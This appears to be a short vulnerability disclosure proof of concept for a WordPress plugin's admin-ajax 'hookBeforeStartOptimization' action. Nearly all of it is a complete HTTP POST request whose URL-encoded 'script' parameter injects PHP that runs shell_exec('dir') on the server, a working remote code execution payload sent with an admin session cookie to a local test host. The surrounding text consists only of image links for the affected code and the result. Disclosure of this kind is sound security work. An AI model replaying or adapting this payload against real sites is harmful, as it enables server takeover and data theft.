Affected code:

<img src="https://imgur.com/Y4axaee.png">

Request to trigger:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: wordfence.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://wordfence.local/wp-admin/options-general.php?page=w3_speedster
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 159
Origin: http://wordfence.local
Connection: keep-alive
Cookie: wordpress_94f538d6f95d9823771d4c50162fe4ef=admin%7C1723258327%7CENxteyjqPE6xwvTKxgFQuM1jqLuhx2Bd5X47nqWyxyB%7Caf79c371ea88a7be619825497bcccf776a17ea3d86c4a2659dda4879dcfd8882; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_94f538d6f95d9823771d4c50162fe4ef=admin%7C1723258327%7CENxteyjqPE6xwvTKxgFQuM1jqLuhx2Bd5X47nqWyxyB%7C962c383737bb3e1e0c1d8874bea47614098055a040d03bf7ceaea84c7586b25b; wp-settings-time-1=1723138213; tk_ai=jetpack%3AvukhxLE%2Fal8xF4GvE9abN7vX
Priority: u=0

action=hookBeforeStartOptimization&script=%7b%0a%20%20%22test%22%3a%20%7b%0a%20%20%20%20%22value%22%3a%20%22var_dump(shell_exec('dir'))%3b%22%0a%20%20%7d%0a%7d
```
POC:

<img src="https://imgur.com/DyzyW6e.png">
